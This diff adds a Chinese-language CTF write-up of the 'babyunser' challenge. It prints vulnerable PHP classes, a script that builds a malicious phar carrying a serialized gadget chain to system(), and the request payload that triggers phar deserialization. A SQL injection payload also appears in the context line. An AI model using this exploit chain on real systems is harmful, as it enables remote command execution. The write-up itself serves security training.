@@ -882,3 +882,206 @@ wllm=-1'/**/union/**/select/**/1,mid((select/**/flag/**/from/**/LTLT_flag/**/lim
 ```
 
 可以得到 `-430e-961b-ab03b3fb` 和 `2d32}` 拼起来就是 flag 了。
+
+### babyunser
+
+进入题目后可以看见 `上传文件` 和 `查看文件` 两个入口，经过一番摸索后，在 `查看文件` 处输入 `read.php` 可以看到该文件的源代码，可以发现还存在一个文件 `class.php` 如下
+
+```php
+<?php
+class aa{
+    public $name;
+
+    public function __construct(){
+        $this->name='aa';
+    }
+
+    public function __destruct(){
+        $this->name=strtolower($this->name);
+    }
+}
+
+class ff{
+    private $content;
+    public $func;
+
+    public function __construct(){
+        $this->content="\<?php @eval(\$_POST[1]);?>";
+    }
+
+    public function __get($key){
+        $this->$key->{$this->func}($_POST['cmd']);
+    }
+}
+
+class zz{
+    public $filename;
+    public $content='surprise';
+
+    public function __construct($filename){
+        $this->filename=$filename;
+    }
+
+    public function filter(){
+        if(preg_match('/^\/|php:|data|zip|\.\.\//i',$this->filename)){
+            die('这不合理');
+        }
+    }
+
+    public function write($var){
+        $filename=$this->filename;
+        $lt=$this->filename->$var;
+        //此功能废弃，不想写了
+    }
+
+    public function getFile(){
+        $this->filter();
+        $contents=file_get_contents($this->filename);
+        if(!empty($contents)){
+            return $contents;
+        }else{
+            die("404 not found");
+        }
+    }
+
+    public function __toString(){
+        $this->{$_POST['method']}($_POST['var']);
+        return $this->content;
+    }
+}
+
+class xx{
+    public $name;
+    public $arg;
+
+    public function __construct(){
+        $this->name='eval';
+        $this->arg='phpinfo();';
+    }
+
+    public function __call($name,$arg){
+        $name($arg[0]);
+    }
+}
+```
+
+链子如下
+
+```php
+<?php
+class aa{
+  public $name;
+
+  public function setName($name)
+  {
+    $this->name = $name;
+  }
+
+  public function __construct(){
+    $this->name='aa';
+  }
+
+  public function __destruct(){
+    $this->name=strtolower($this->name);
+  }
+}
+
+class ff{
+  private $content;
+
+  public function setContent($content)
+  {
+    $this->content = $content;
+  }
+  public $func;
+
+  public function setFunc($func)
+  {
+    $this->func = $func;
+  }
+
+  public function __construct(){
+    $this->content="\<?php @eval(\$_POST[1]);?>";
+  }
+
+  public function __get($key){
+    $this->$key->{$this->func}($_POST['cmd']);
+  }
+}
+
+class zz{
+  public $filename;
+
+  public function setFilename($filename)
+  {
+    $this->filename = $filename;
+  }
+  public $content='surprise';
+
+  public function __construct($filename){
+    $this->filename=$filename;
+  }
+
+  public function filter(){
+    if(preg_match('/^\/|php:|data|zip|\.\.\//i',$this->filename)){
+      die('这不合理');
+    }
+  }
+
+  public function write($var){
+    $filename=$this->filename;
+    $lt=$this->filename->$var;
+    //此功能废弃，不想写了
+  }
+
+  public function getFile(){
+    $this->filter();
+    $contents=file_get_contents($this->filename);
+    if(!empty($contents)){
+      return $contents;
+    }else{
+      die("404 not found");
+    }
+  }
+
+  public function __toString(){ // L10
+    $this->{$_POST['method']}($_POST['var']);
+    return $this->content;
+  }
+}
+
+class xx{
+  public $name;
+  public $arg;
+
+  public function __construct(){
+    $this->name='eval';
+    $this->arg='phpinfo();';
+  }
+
+  public function __call($name,$arg){
+    $name($arg[0]);
+  }
+}
+
+$aa = new aa();
+$ff = new ff();
+$xx = new xx();
+$ff->setContent($xx);
+$ff->setFunc('system');
+$zz = new zz($ff);
+$aa->name = $zz;
+
+$phar = new Phar('1.phar');
+$phar->startBuffering();
+$phar->setStub("<?php __HALT_COMPILER(); ?>");
+$phar->setMetadata($aa);
+$phar->addFromString("test.txt", "text");
+$phar->stopBuffering();
+```
+
+Payload 如下
+
+```
+file=phar://upload/25cb04b89bbe7007013ec2171ab27333.txt&method=write&var=content&cmd=cat /flag
+```
